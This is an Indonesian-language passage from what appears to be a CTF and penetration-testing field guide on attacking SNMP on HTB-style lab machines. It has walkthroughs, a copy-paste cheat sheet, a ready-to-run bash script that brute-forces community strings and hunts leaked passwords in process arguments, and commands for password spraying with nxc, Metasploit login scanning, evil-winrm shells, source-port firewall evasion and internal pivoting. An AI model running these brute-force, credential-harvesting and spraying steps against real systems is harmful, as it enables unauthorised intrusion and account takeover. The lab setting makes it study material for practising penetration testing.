### 2. Semua Community String Gagal (Brute Force 100% Gagal)
* **Penyebab**: Target menggunakan community string non-standar yang sangat panjang, atau server hanya mengaktifkan **SNMP v3**.
* **Solusi CLI**: Jalankan script Nmap khusus v3 untuk memeriksa keberadaan EngineID:
```bash
nmap -sU -p 161 --script snmp-info $TARGET
```

---

### 3. `snmpwalk: Timeout: No Response from <IP>`
* **Penyebab**: Paket UDP hilang di perjalanan akibat latency jaringan VPN, atau community string salah.
* **Solusi CLI**: Naikkan timeout (`-t 5`) dan tambahkan retries (`-r 3`):
```bash
snmpwalk -v2c -c public -t 5 -r 3 $TARGET 1.3.6.1.2.1.1
```

---

### 4. Output Nilai SNMP Berupa `Hex-STRING`
* **Penyebab**: Data berisi karakter biner atau teks terenkripsi dalam format representasi heksadesimal.
* **Solusi CLI**: Decode menggunakan `xxd` di terminal:
```bash
echo "41 64 6D 69 6E" | xxd -r -p
```

---

### 5. Pesan Error: `No Such Object available on this agent at this OID`
* **Penyebab**: OID yang Anda minta tidak didukung oleh sistem operasi target (contoh: OID User Windows diminta ke server Linux).
* **Solusi**: Periksa kembali tabel [BAGIAN 4: OID CHEAT SHEET] dan gunakan OID yang sesuai dengan platform target.

---

### 6. Rate Limiting dari Target Menyebabkan Banyak Query Hilang
* **Penyebab**: Daemon SNMP menerapkan proteksi *packet flooding*.
* **Solusi CLI**: Berikan jeda waktu antar-paket pada `onesixtyone` (`-w 100` ms) atau turunkan thread.

---

### 7. Port 161 Aktif Tetapi Tidak Terdeteksi Nmap
* **Penyebab**: Nmap scan TCP mengabaikan port UDP secara default.
* **Solusi CLI**: Selalu sertakan flag `-sU` dan jalankan dengan `sudo`:
```bash
sudo nmap -sU -p 161 -Pn $TARGET
```

---

### 8. `snmpwalk` Berjalan Sangat Lambat (Bermiliar OID)
* **Penyebab**: Protokol v1/v2c melakukan query satu per satu.
* **Solusi CLI**: Beralihlah ke `snmpbulkwalk` yang jauh lebih efisien:
```bash
snmpbulkwalk -v2c -c public -Cn0 -Cr20 $TARGET 1.3.6.1.2.1.25
```

---

### 9. Community String Berhasil Tetapi Output Sangat Sedikit
* **Penyebab**: Administrator mengonfigurasi *Restricted MIB View* (hanya mengizinkan pembacaan sub-pohon `system` dan memblokir sub-pohon `host resources`).
* **Solusi**: Uji coba community string lain yang ditemukan (misal: `private` atau `internal`) yang memiliki akses MIB lebih luas.

---

### 10. Windows SNMP Tidak Menampilkan Daftar Akun User
* **Penyebab**: Service SNMP di Windows target tidak menginstal agen ekstensi *Host Resources* atau *LAN Manager MIB*.
* **Solusi CLI**: Cek nama user melalui proses aktif yang sedang berjalan di `1.3.6.1.2.1.25.4.2.1.2` atau periksa path user di `C:\Users\` via `1.3.6.1.2.1.25.2.3.1.3`.

---

## 🏆 BAGIAN 10: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: SNMP "public" ➔ Process Argument Leak ➔ SSH Foothold

**Target**: Linux Box (HTB Knife / Networked Style)

#### Step 1: Deteksi SNMP & Brute Force Community
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.120
# Output: 10.10.11.120 [public] Linux knife 5.4.0-80-generic
```

#### Step 2: Inspeksi Parameter Command-Line Proses Aktif
```bash
snmpwalk -v2c -c public 10.10.11.120 1.3.6.1.2.1.25.4.2.1.5
```
* **Output Terminal**:
```text
HOST-RESOURCES-MIB::hrSWRunParameters.892 = STRING: "/usr/sbin/sshd -D"
HOST-RESOURCES-MIB::hrSWRunParameters.1240 = STRING: "/usr/bin/python3 /opt/sync.py --user james --password P@ssw0rdSecure2024!"
```

#### Step 3: Login Langsung via SSH Menggunakan Kredensial Bocor
```bash
ssh james@10.10.11.120
# Password: P@ssw0rdSecure2024!
```
```text
james@knife:~$ whoami
james
james@knife:~$ cat ~/user.txt
a987d6f5e4c3b2a10987654321fedcba
```

---

### 📝 EXAMPLE 2: SNMP Windows User Enum ➔ SMB Password Spray ➔ WinRM Shell

**Target**: Windows Active Directory Box (HTB Cascade / Sauna Style)

#### Step 1: Ekstraksi Akun Pengguna Windows via SNMP
```bash
snmpwalk -v2c -c public 10.10.11.150 1.3.6.1.4.1.77.1.2.25 | awk -F': ' '{print $2}' | tr -d '"' > users.txt
cat users.txt
```
* **Daftar User Ditemukan**: `administrator`, `svc-backup`, `r.thompson`, `s.clark`.

#### Step 2: Password Spraying ke SMB Port 445 ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba))
```bash
nxc smb 10.10.11.150 -u users.txt -p 'Welcome2024!' --continue-on-success
```
* **Output**: `SMB 10.10.11.150 445 DC01 [+] CASCADE\r.thompson:Welcome2024! (Pwn3d!)`

#### Step 3: Login Remote Management via Evil-WinRM & Dump AD Map
```bash
evil-winrm -i 10.10.11.150 -u 'r.thompson' -p 'Welcome2024!'
# Interactive PowerShell Session Established!
# Lanjut ke BloodHound enumerasi untuk eskalasi Domain Admin!
```

---

### 📝 EXAMPLE 3: SNMP Network Interfaces ➔ Dual-NIC Discovery ➔ Internal Pivoting

**Target**: Mesin Linux Gateway (HTB Pivoting Style)

#### Step 1: Dump Informasi Antarmuka Jaringan
```bash
snmp-check -t 10.10.11.180 -c public
```
* **Output Bagian Network Interfaces**:
```text
[*] Network interfaces:
Interface: eth0, IP: 10.10.11.180, Netmask: 255.255.255.0 (Public VPN Subnet)
Interface: eth1, IP: 192.168.100.1, Netmask: 255.255.255.0 (Hidden Internal Subnet!)
```

#### Step 2: Eksploitasi Foothold & Pembentukan SOCKS5 Proxy
Setelah memperoleh shell di mesin `10.10.11.180`, kita langsung membuka SSH Dynamic SOCKS5 Proxy di port 1080 ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)) dan memindai subnet privat `192.168.100.0/24` yang sebelumnya tidak terlihat!

---

## ⚡ BAGIAN 11: CHEATSHEET SNMP (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export COMMUNITY="public"
```

```bash
# ==========================================
# 1. DETEKSI & COMMUNITY BRUTE FORCE
# ==========================================
sudo nmap -sU -p 161 -Pn $TARGET                         # Quick UDP port 161 scan
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET # Fast brute

# ==========================================
# 2. AUTOMATED RECON & REPORTING
# ==========================================
snmp-check -t $TARGET -c $COMMUNITY                      # Human-readable automated report
nmap -sU -p 161 \
  --script snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-users \
  --script-args snmpcommunity=$COMMUNITY $TARGET         # Reliable comprehensive Nmap scripts

# ==========================================
# 3. HIGH-VALUE TARGETED QUERIES
# ==========================================
# System Description (OS / Kernel):
snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.1.0

# Hostname:
snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.5.0

# Running Processes (Nama Proses):
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Running Process Parameters (PASSWORD LEAK!):
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.5

# Network Interfaces & Subnet IPs:
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.20.1.1

# Windows User Accounts:
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25

# Installed Software (Windows):
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3.1.2

# Listening TCP Ports:
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.6.13.1.3

# ==========================================
# 4. FAST BULK DUMP (OPTIMAL UNTUK VPN)
# ==========================================
snmpbulkwalk -v2c -c $COMMUNITY -Cn0 -Cr10 -t 3 -r 2 $TARGET 1.3.6.1.2.1.25
```

---

## ⚡ BAGIAN 12: AUTOMATION SCRIPT — `snmp_auto_enum.sh`

Script otomasi siap pakai di Parrot OS XFCE untuk menjalankan deteksi port 161 UDP, brute force community string, pembuatan laporan `snmp-check`, pencarian kredensial bocor pada parameter proses, serta ekstraksi user Windows secara otomatis:

```bash
#!/bin/bash
# ==============================================================================
# Script Name : snmp_auto_enum.sh
# Description : Otomasi Penuh Enumerasi SNMP, Credential Hunting, & User Dump
# Usage       : ./snmp_auto_enum.sh <TARGET_IP>
# Example     : ./snmp_auto_enum.sh 10.10.11.200
# ==============================================================================

TARGET=$1
OUTPUT_DIR="./snmp_results_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    echo "Contoh: $0 10.10.11.200"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "\033[1;34m[*] ========================================================\033[0m"
echo -e "\033[1;34m[*] STARTING SNMP AUTO ENUMERATION: Target $TARGET\033[0m"
echo -e "\033[1;34m[*] ========================================================\033[0m"

# Step 1: Detect SNMP on Port 161 UDP
echo -e "\n\033[1;33m[+] Step 1: Detecting SNMP on Port 161 UDP...\033[0m"
sudo nmap -sU -p 161 --script snmp-info -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_snmp.txt" 2>/dev/null

if grep -q "open" "$OUTPUT_DIR/nmap_snmp.txt"; then
    echo -e "\033[1;32m[+] SNMP Port 161 Terdeteksi Aktif!\033[0m"
else
    echo -e "\033[1;31m[-] SNMP tidak merespon paket probe UDP standar.\033[0m"
fi

# Step 2: Community String Brute Force
echo -e "\n\033[1;33m[+] Step 2: Brute Forcing Community Strings (onesixtyone)...\033[0m"
WORDLIST="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "[-] SecLists tidak ditemukan, membuat list default..."
    echo -e "public\nprivate\nmanager\nadmin\ndefault\ncisco\ncommunity\nmonitor\ninternal" > /tmp/snmp_default.txt
    WORDLIST="/tmp/snmp_default.txt"
fi

onesixtyone -c "$WORDLIST" "$TARGET" | tee "$OUTPUT_DIR/communities.txt"

# Extract valid community string
COMMUNITY=$(grep "\[$TARGET\]" "$OUTPUT_DIR/communities.txt" 2>/dev/null | head -n 1 | grep -oP '\[\K[^\]]+' | head -n 1)

if [ -z "$COMMUNITY" ]; then
    # Fallback check
    COMMUNITY=$(grep -E "public|private|manager" "$OUTPUT_DIR/communities.txt" 2>/dev/null | awk '{print $2}' | tr -d '[]' | head -n 1)
fi

if [ -z "$COMMUNITY" ]; then
    echo -e "\033[1;31m[-] Tidak ada valid community string v1/v2c yang ditemukan.\033[0m"
    echo "[*] Periksa kemungkinan SNMP v3: nmap -sU -p 161 --script snmp-info $TARGET"
    exit 1
fi

echo -e "\033[1;32m[+] VALID COMMUNITY STRING DITEMUKAN: $COMMUNITY\033[0m"

# Step 3: Automated snmp-check Report
echo -e "\n\033[1;33m[+] Step 3: Menjalankan snmp-check...\033[0m"
if command -v snmp-check >/dev/null 2>&1; then
    snmp-check -t "$TARGET" -c "$COMMUNITY" > "$OUTPUT_DIR/snmp_check_report.txt" 2>/dev/null
    echo "[+] Laporan snmp-check tersimpan di: $OUTPUT_DIR/snmp_check_report.txt"
else
    echo "[-] snmp-check belum terinstall (sudo apt install snmp-check -y). Melewati langkah ini."
fi

# Step 4: Targeted OID Extractions
echo -e "\n\033[1;33m[+] Step 4: Menjalankan Targeted OID Extractions...\033[0m"

# 4a. System Information
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.1 > "$OUTPUT_DIR/system_info.txt" 2>/dev/null

# 4b. Hunting Password Leak di Process Arguments (PRIORITAS NOMOR 1!)
echo "[*] Memeriksa kebocoran password pada parameter proses (hrSWRunParameters)..."
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.25.4.2.1.5 2>/dev/null \
  | grep -iE "pass|pwd|secret|token|key|admin" \
  | tee "$OUTPUT_DIR/POTENTIAL_CREDENTIALS.txt"

if [ -s "$OUTPUT_DIR/POTENTIAL_CREDENTIALS.txt" ]; then
    echo -e "\n\033[1;31m========================================================\033[0m"
    echo -e "\033[1;31m  ⚠️  POTENTIAL CREDENTIALS FOUND IN PROCESS ARGS!     \033[0m"
    echo -e "\033[1;31m========================================================\033[0m"
    cat "$OUTPUT_DIR/POTENTIAL_CREDENTIALS.txt"
fi

# 4c. Network Interfaces (Pivoting Discovery)
echo -e "\n[*] Memeriksa seluruh antarmuka jaringan & IP internal..."
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.2.1.4.20.1.1 2>/dev/null | tee "$OUTPUT_DIR/network_ips.txt"

# 4d. Windows User Accounts (svUserName)
echo -e "\n[*] Memeriksa daftar akun pengguna Windows..."
snmpwalk -v2c -c "$COMMUNITY" "$TARGET" 1.3.6.1.4.1.77.1.2.25 2>/dev/null \
  | awk -F': ' '{print $2}' \
  | tr -d '"' \
  | grep -v "^$" \
  | sort -u \
  | tee "$OUTPUT_DIR/windows_users.txt"

if [ -s "$OUTPUT_DIR/windows_users.txt" ]; then
    echo -e "\033[1;32m[+] Daftar pengguna Windows berhasil disimpan ke $OUTPUT_DIR/windows_users.txt\033[0m"
    echo "[*] Rekomendasi: Lakukan password spraying via NetExec:"
    echo "    nxc smb $TARGET -u $OUTPUT_DIR/windows_users.txt -p 'Welcome2024!'"
fi

echo -e "\n\033[1;34m[*] Enumerasi selesai! Seluruh artefak tersimpan di: $OUTPUT_DIR/\033[0m"
```

```bash
# Cara Menjalankan Script di Parrot OS:
chmod +x snmp_auto_enum.sh
./snmp_auto_enum.sh 10.10.11.200
```

---

# SNMP Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.  
> **⚠️ PENTING:** SNMP berjalan di **UDP** bukan TCP! Scan default nmap tidak akan mendeteksi ini. Selalu pakai `-sU`.

---
## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export COMMUNITY="public"    # Default, update setelah brute force
mkdir -p ~/snmp_loot/{dump,creds,users,network}
cd ~/snmp_loot

echo "[*] Target: $TARGET | Community: $COMMUNITY"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | Community: public
```

---

## ═══════════════════════════════════════

## FASE 0: DETEKSI PORT UDP 161

## ═══════════════════════════════════════

### Langkah 0.1 — Scan UDP Port 161 (WAJIB SUDO!)

Bash

```
# Command 1: Quick UDP scan - WAJIB sudo!
sudo nmap -sU -p 161 -Pn $TARGET

# Command 2: Dengan script probe sekaligus (lebih informatif)
sudo nmap -sU -p 161 --script snmp-info -Pn $TARGET

# Command 3: Jika ingin scan UDP + TCP sekaligus (komprehensif)
sudo nmap -sU -sS -p U:161,T:22,80,443,445 -Pn $TARGET
```

**OUTPUT BERHASIL ✅ — Port 161 UDP terbuka:**

text

```
PORT      STATE SERVICE REASON
161/udp   open  snmp    udp-response ttl 63
| snmp-info:
|   enterprise: net-snmp
|   engineBoots: 1
|_  snmpEngineTime: 1h14m22s
```

➡️ SNMP aktif dan merespon. Lanjut ke **Fase 1 (Community String Brute Force)**

**OUTPUT GAGAL ❌ — Port open|filtered:**

text

```
PORT      STATE           SERVICE
161/udp   open|filtered   snmp
```

➡️ Port ada tapi nmap tidak bisa konfirmasi. Ini NORMAL untuk UDP! Tetap lanjutkan brute force:

Bash

```
# Coba langsung dengan onesixtyone — lebih reliable dari nmap untuk UDP
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET

# Atau coba manual dengan snmpget
snmpget -v2c -c public -t 2 $TARGET 1.3.6.1.2.1.1.1.0 2>/dev/null
```

**OUTPUT GAGAL ❌ — Port filtered/closed:**

text

```
PORT      STATE    SERVICE
161/udp   filtered snmp
```

➡️ SNMP tidak aktif atau di-firewall. Coba:

Bash

```
# Test dengan source port yang berbeda (beberapa firewall allow dari port 53/161)
sudo nmap -sU -p 161 --source-port 161 $TARGET
sudo nmap -sU -p 161 --source-port 53 $TARGET

# Cek port SNMP trap (kadang agent aktif di 162 juga)
sudo nmap -sU -p 162 $TARGET
```

➡️ Jika tetap filtered → SNMP tidak tersedia di target ini. Lanjut ke service berikutnya.

---

### Langkah 0.2 — Quick Manual Verification

Bash

```
# Test langsung apakah community string 'public' berhasil
# Jika ada output → SNMP aktif dengan community public
snmpget -v2c -c public -t 3 -r 1 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null

# Test dengan versi 1
snmpget -v1 -c public -t 3 -r 1 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Langsung dapat hostname:**

text

```
SNMPv2-MIB::sysName.0 = STRING: monitor.htb
```

➡️ Community string `public` valid! Export dan lanjut ke **Fase 2 (MIB Enumeration)** langsung, skip brute force:

Bash

```
export COMMUNITY="public"
echo "[+] Community string valid: $COMMUNITY"
```

**OUTPUT GAGAL ❌ — Timeout atau no response:**

text

```
Timeout: No Response from 10.10.11.200
```

➡️ Community string `public` tidak valid atau SNMP dikonfigurasi berbeda. Lanjut ke **Fase 1**.

**Lanjut ke FASE 1.**

---

## ═══════════════════════════════════════

## FASE 1: COMMUNITY STRING BRUTE FORCE

## ═══════════════════════════════════════

> **Tujuan:** Temukan community string yang valid. Ini adalah "password" SNMP.  
> **Urutan prioritas:** onesixtyone dulu (tercepat) → manual check → metasploit

### Langkah 1.1 — Brute Force dengan onesixtyone (Tercepat)

Bash

```
# Command 1: Wordlist komprehensif dari SecLists
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET \
    | tee ~/snmp_loot/communities_found.txt

# Command 2: Wordlist lebih besar
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET \
    | tee -a ~/snmp_loot/communities_found.txt

# Command 3: Jika SecLists belum ada, buat manual
cat > /tmp/snmp_communities.txt << 'EOF'
public
private
manager
admin
cisco
default
community
monitor
internal
network
read
snmp
backup
secret
test
guest
EOF
onesixtyone -c /tmp/snmp_communities.txt $TARGET
```

**OUTPUT BERHASIL ✅ — Community string ditemukan:**

text

```
Scanning 1 hosts, 114 communities
10.10.11.200 [public] Linux target-box 5.4.0-42-generic #46-Ubuntu SMP x86_64
10.10.11.200 [backup] Linux target-box 5.4.0-42-generic #46-Ubuntu SMP x86_64
```

➡️ **DUA community string valid ditemukan!** Catat semua:

Bash

```
# Update variabel dengan community string yang ditemukan
export COMMUNITY="public"
export COMMUNITY2="backup"   # Community string kedua
echo "public" > ~/snmp_loot/valid_communities.txt
echo "backup" >> ~/snmp_loot/valid_communities.txt

echo "[+] Valid communities: $(cat ~/snmp_loot/valid_communities.txt | tr '\n' ' ')"
```

**CATATAN — Community string non-default (backup, internal, dll):**

> Community string non-standar seperti `backup` atau `internal` sering memiliki akses MIB yang LEBIH LUAS dari `public`. Selalu test semua yang ditemukan!

**OUTPUT GAGAL ❌ — Tidak ada yang respond:**

text

```
Scanning 1 hosts, 114 communities
(tidak ada output lain)
```

➡️ Kemungkinan SNMP v3, atau community string sangat custom. Coba:

Bash

```
# Method alternatif 1: Metasploit scanner
msfconsole -q -x "
use auxiliary/scanner/snmp/snmp_login;
set RHOSTS $TARGET;
set THREADS 10;
run;
exit
"

# Method alternatif 2: Script bash dengan snmpget (lebih verbose)
echo "[*] Trying community strings manually..."
for comm in public private manager admin default cisco community monitor internal backup network secret test; do
    result=$(snmpget -v2c -c "$comm" -t 1 -r 0 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null)
    if [ -n "$result" ]; then
        echo -e "\033[1;32m[+] VALID: $comm\033[0m → $result"
        echo "$comm" >> ~/snmp_loot/valid_communities.txt
        export COMMUNITY="$comm"
    fi
done

# Method alternatif 3: Coba SNMP v1 (beberapa device hanya support v1)
for comm in public private manager; do
    result=$(snmpget -v1 -c "$comm" -t 1 -r 0 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null)
    [ -n "$result" ] && echo "[+] SNMP v1 VALID: $comm" && export COMMUNITY="$comm"
done
```

**OUTPUT GAGAL ❌ — Semua gagal, kemungkinan SNMP v3:**

Bash

```
# Deteksi SNMP v3 dengan nmap
sudo nmap -sU -p 161 --script snmp-info $TARGET

# Jika output ada "version: 3" atau "engineID" → SNMP v3 aktif
# Coba brute force username v3 (butuh creds dari file config/backup)
```

**Lanjut ke FASE 2 setelah dapat valid community string.**

---

## ═══════════════════════════════════════

## FASE 2: QUICK AUTOMATED SCAN (Jalankan Dulu!)

## ═══════════════════════════════════════

> **Tujuan:** Dapatkan overview lengkap dalam format rapi sebelum deep-dive ke OID spesifik.

### Langkah 2.1 — snmp-check (Human-Readable Report)

Bash

```
# Cek apakah snmp-check tersedia
which snmp-check 2>/dev/null || echo "Install: sudo apt install snmp-check -y"

# Jalankan snmp-check - menghasilkan laporan terstruktur dalam satu command
snmp-check -t $TARGET -c $COMMUNITY | tee ~/snmp_loot/dump/snmp_check_full.txt

# Jika ada multiple community strings, test keduanya
snmp-check -t $TARGET -c backup | tee ~/snmp_loot/dump/snmp_check_backup.txt
```

**OUTPUT BERHASIL ✅ — snmp-check menghasilkan laporan:**

text

```
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2011-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.200:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 10.10.11.200
  Hostname                      : monitor.htb
  Description                   : Linux monitor.htb 5.4.0-80-generic #90-Ubuntu SMP x86_64
  Contact                       : Admin <jordan@monitor.htb>
  Location                      : DataCenter Rack 4, London
  Uptime snmp                   : 1 day, 02:34:18.43
  
[*] Network information:
  IP forwarding enabled         : no
  Default TTL                   : 64
  
[*] Network interfaces:
  Interface                     : eth0
  IP Address                    : 10.10.11.200
  Netmask                       : 255.255.255.0
  
  Interface                     : eth1
  IP Address                    : 172.16.10.1      ← INTERNAL SUBNET DITEMUKAN!
  Netmask                       : 255.255.255.0

[*] Processes:
  Id   Status    Name              Path                      Parameters
  1024  running   python3           /usr/bin/python3          /opt/sync.py --user james --password P@ssw0rd2024!
```

**Cara baca dan tindakan:**

|Temuan|Nilai|Tindakan Langsung|
|---|---|---|
|`Contact: jordan@monitor.htb`|Email admin|→ username `jordan` untuk SSH/SMB spray|
|`Hostname: monitor.htb`|FQDN|→ tambahkan ke `/etc/hosts`|
|`eth1: 172.16.10.1`|Dual-NIC!|→ pivot target via SSH tunnel|
|`--password P@ssw0rd2024!`|**PASSWORD BOCOR!**|→ test ke SSH/SMB langsung!|

Bash

```
# Langsung save temuan penting
echo "$TARGET monitor.htb" | sudo tee -a /etc/hosts
echo "jordan:P@ssw0rd2024!" >> ~/snmp_loot/creds/found_creds.txt
echo "james:P@ssw0rd2024!" >> ~/snmp_loot/creds/found_creds.txt

# Test credentials yang bocor SEKARANG!
nxc ssh $TARGET -u jordan -p "P@ssw0rd2024!"
nxc ssh $TARGET -u james -p "P@ssw0rd2024!"
nxc smb $TARGET -u jordan -p "P@ssw0rd2024!"
```

**OUTPUT GAGAL ❌ — snmp-check tidak terinstall:**

text

```
snmp-check: command not found
```

➡️ Install atau gunakan alternatif:

Bash

```
# Install snmp-check
sudo apt update && sudo apt install snmp-check -y

# Alternatif jika tidak bisa install: snmpwalk dengan filter
snmpwalk -v2c -c $COMMUNITY $TARGET | grep -E "sysDescr|sysName|sysContact|sysLocation|ifDescr|ipAddr" | head -30
```

---

### Langkah 2.2 — Nmap NSE Scripts (Paralel dengan snmp-check)

Bash

```
# Jalankan di terminal terpisah sementara snmp-check jalan
sudo nmap -sU -p 161 \
    --script snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-users \
    --script-args snmpcommunity=$COMMUNITY \
    $TARGET \
    -oN ~/snmp_loot/dump/nmap_snmp_scripts.txt

# Lihat hasilnya
cat ~/snmp_loot/dump/nmap_snmp_scripts.txt
```

**OUTPUT BERHASIL ✅ — Nmap NSE:**

text

```
PORT      STATE SERVICE
161/udp   open  snmp
| snmp-sysdescr:
|   Linux monitor.htb 5.4.0-80-generic #90-Ubuntu SMP x86_64
| snmp-interfaces:
|   eth0: 10.10.11.200/24 (up)
|   lo: 127.0.0.1/8 (up)
| snmp-win32-users:
|   admin
|   jordan
|_  james
```

**Lanjut ke FASE 3.**

---

## ═══════════════════════════════════════

## FASE 3: MIB TREE DEEP ENUMERATION

## ═══════════════════════════════════════

> **Tujuan:** Extract semua informasi berharga secara sistematis per kategori OID.

### Langkah 3.1 — Full MIB Dump (Simpan Dulu, Analisis Belakangan)

Bash

```
# Dump SELURUH MIB tree ke file - jalankan ini dulu!
echo "[*] Dumping full MIB tree... (bisa butuh 1-5 menit)"
snmpwalk -v2c -c $COMMUNITY $TARGET > ~/snmp_loot/dump/full_mib_dump.txt 2>/dev/null

echo "[*] Total lines: $(wc -l < ~/snmp_loot/dump/full_mib_dump.txt)"

# Alternatif LEBIH CEPAT: snmpbulkwalk (5-10x lebih cepat)
snmpbulkwalk -v2c -c $COMMUNITY -Cn0 -Cr10 -t 3 -r 2 $TARGET \
    > ~/snmp_loot/dump/bulk_mib_dump.txt 2>/dev/null

echo "[*] Bulk dump lines: $(wc -l < ~/snmp_loot/dump/bulk_mib_dump.txt)"
```

**OUTPUT BERHASIL ✅ — Dump berhasil:**

text

```
[*] Total lines: 4521
[*] Bulk dump lines: 4521
```

➡️ Sekarang analisis isi dump:

Bash

```
# PRIORITAS 1: Cari password/credentials yang bocor
echo "=== CREDENTIAL HUNTING ==="
grep -iE "pass|pwd|password|secret|token|key|login|cred|auth" ~/snmp_loot/dump/full_mib_dump.txt \
    | tee ~/snmp_loot/creds/potential_creds.txt

# PRIORITAS 2: Semua nilai STRING (paling mudah dibaca)
echo "=== ALL STRING VALUES ==="
grep "STRING:" ~/snmp_loot/dump/full_mib_dump.txt | head -50

# PRIORITAS 3: Ekstrak string bersih untuk review cepat
grep "STRING:" ~/snmp_loot/dump/full_mib_dump.txt \
    | awk -F'STRING: ' '{print $2}' \
    | tr -d '"' \
    | sort -u \
    > ~/snmp_loot/dump/clean_strings.txt
cat ~/snmp_loot/dump/clean_strings.txt
```

**OUTPUT BERHASIL ✅ — Credentials ditemukan di dump:**

text

```
HOST-RESOURCES-MIB::hrSWRunParameters.1450 = STRING: "-u root -pSuperSecretDBPass2024! -h 127.0.0.1 db_prod"
HOST-RESOURCES-MIB::hrSWRunParameters.1890 = STRING: "/opt/backup.sh --token=ghp_98a7sd98f7a9sd8f7asdf"
```

➡️ **JACKPOT!** Simpan credentials:

Bash

```
echo "root:SuperSecretDBPass2024! (MySQL)" >> ~/snmp_loot/creds/found_creds.txt
echo "github_token:ghp_98a7sd98f7a9sd8f7asdf" >> ~/snmp_loot/creds/found_creds.txt

# Test MySQL credentials
nxc mysql $TARGET -u root -p "SuperSecretDBPass2024!"
# → Ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a> jika berhasil
```

**OUTPUT GAGAL ❌ — Timeout saat snmpwalk:**

text

```
Timeout: No Response from 10.10.11.200
```

➡️ Tambahkan timeout dan retry:

Bash

```
# Naikkan timeout dan retry
snmpwalk -v2c -c $COMMUNITY -t 5 -r 3 $TARGET 1.3.6.1.2.1.1 \
    > ~/snmp_loot/dump/full_mib_dump.txt 2>/dev/null

# Jika masih timeout, coba per subtree
snmpwalk -v2c -c $COMMUNITY -t 5 $TARGET 1.3.6.1.2.1.1   # system info
snmpwalk -v2c -c $COMMUNITY -t 5 $TARGET 1.3.6.1.2.1.25  # host resources
```

**OUTPUT GAGAL ❌ — Sangat lambat (ribuan OID):**

Bash

```
# Beralih ke snmpbulkwalk yang JAUH lebih cepat
snmpbulkwalk -v2c -c $COMMUNITY -Cn0 -Cr20 -t 5 -r 2 $TARGET \
    > ~/snmp_loot/dump/full_mib_dump.txt 2>/dev/null
```

---

### Langkah 3.2 — Targeted OID Queries (High-Value Targets)

Bash

```
# OID 1: System Description (OS + Kernel version - untuk exploit search)
echo "=== SYSTEM INFO ==="
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1
```

**OUTPUT BERHASIL ✅ — System info:**

text

```
SNMPv2-MIB::sysDescr.0 = STRING: Linux monitor.htb 5.4.0-80-generic #90-Ubuntu SMP x86_64
SNMPv2-MIB::sysContact.0 = STRING: Admin <jordan@monitor.htb>
SNMPv2-MIB::sysName.0 = STRING: monitor.htb
SNMPv2-MIB::sysLocation.0 = STRING: DataCenter Rack 4, London
```

**Cara baca dan tindakan:**

|Field|Value|Tindakan|
|---|---|---|
|`sysDescr`|`Linux 5.4.0-80`|`searchsploit linux kernel 5.4`|
|`sysContact`|`jordan@monitor.htb`|username `jordan` untuk auth|
|`sysName`|`monitor.htb`|tambahkan ke `/etc/hosts`|

Bash

```
# Simpan informasi penting
HOSTNAME=$(snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.5.0 +short 2>/dev/null | tr -d '"')
OS_INFO=$(snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.1.0 2>/dev/null | awk -F'STRING: ' '{print $2}')
ADMIN_EMAIL=$(snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.4.0 2>/dev/null | awk -F'STRING: ' '{print $2}')

echo "Hostname: $HOSTNAME"
echo "OS: $OS_INFO"
echo "Admin: $ADMIN_EMAIL"

# Tambahkan hostname ke /etc/hosts
